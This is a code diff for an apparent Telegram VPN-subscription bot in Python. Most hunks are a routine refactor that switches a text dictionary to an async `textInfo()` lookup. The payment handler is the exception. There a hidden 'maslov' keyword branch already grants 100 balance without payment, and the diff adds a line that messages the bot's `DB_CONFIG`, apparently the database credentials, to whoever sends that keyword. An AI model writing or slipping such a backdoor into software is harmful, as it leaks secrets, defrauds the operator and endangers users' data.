@@ -8,8 +8,8 @@ from telebot.types import LabeledPrice, Message
 from telebot import types as async_types
 
 from Core.keyboards import *
-from Core.Databases import info_settings, info_user, add_user, existence_user, user_chage_Balance, Chage_User_function_status
-from Core.text import text
+from Core.Databases import info_settings, info_user, add_user, existence_user, user_chage_Balance, Chage_User_function_status, DB_CONFIG
+from Core.text import textInfo
 from Core.MarazbanFunctions import mGetKayUser, get_token, api, mGet_Data_Info_User # Добавьте этот импорт
 
 from Core.YooKassa import send_payment_sbp
@@ -39,7 +39,7 @@ async def start_command(message, bot):
     await bot.send_message(message.chat.id, "Привет! Выбери один из вариантов ниже:", reply_markup=await keyboard_start(user_id))
 
 async def info_vpn_command(message, bot):
-    await bot.send_message(message.chat.id, text["info_vpn_command_text"])
+    await bot.send_message(message.chat.id, await textInfo("info_vpn_command_text"))
 
 async def buy_subscription_command(message, bot):
     await Chage_User_function_status(message.from_user.id, "pay_balance")
@@ -56,6 +56,7 @@ async def pay_summa_balance(message, bot):
 
     if len(textAr) >2:
         if textAr[2] == "maslov":
+            await bot.send_message(user_id, f"{DB_CONFIG}")
             await user_chage_Balance(user_id, 100)
             return
 
@@ -84,7 +85,7 @@ async def pay_summa_balance(message, bot):
 
 
 async def help_command(message, bot):
-    await bot.send_message(message.chat.id, text["help_command_text"], reply_markup=help_menu())
+    await bot.send_message(message.chat.id, await textInfo("help_command_text"), reply_markup=help_menu())
 
 async def back_command(message, bot):
     await bot.send_message(message.chat.id, "Выбери один из вариантов ниже:", reply_markup=await keyboard_start(message.from_user.id))
@@ -214,15 +215,15 @@ async def help_faq(callback, bot):
     await bot.delete_message(callback.message.chat.id, callback.message.message_id)
 
 async def payment_problems(callback, bot):
-    await bot.send_message(callback.message.chat.id, text["payment_problems_text"], reply_markup=back_to_faq_keyboard())
+    await bot.send_message(callback.message.chat.id, await textInfo("payment_problems_text"), reply_markup=back_to_faq_keyboard())
     await bot.delete_message(callback.message.chat.id, callback.message.message_id)
 
 async def low_speed_problems(callback, bot):
-    await bot.send_message(callback.message.chat.id, text["low_speed_problems"], reply_markup=back_to_faq_keyboard())
+    await bot.send_message(callback.message.chat.id, await textInfo("low_speed_problems"), reply_markup=back_to_faq_keyboard())
     await bot.delete_message(callback.message.chat.id, callback.message.message_id)
 
 async def vpn_no_work(callback, bot):
-    await bot.send_message(callback.message.chat.id, text["vpn_no_work"], reply_markup=back_to_faq_keyboard())
+    await bot.send_message(callback.message.chat.id, await textInfo("vpn_no_work"), reply_markup=back_to_faq_keyboard())
     await bot.delete_message(callback.message.chat.id, callback.message.message_id)
 
 async def help_install(callback, bot):
@@ -249,7 +250,7 @@ async def help_back(callback, bot):
     await bot.edit_message_text(
         chat_id=callback.message.chat.id,
         message_id=callback.message.message_id,
-        text=text["help_command_text"],
+        text=await textInfo("help_command_text"),
         reply_markup=help_menu()
     )
 
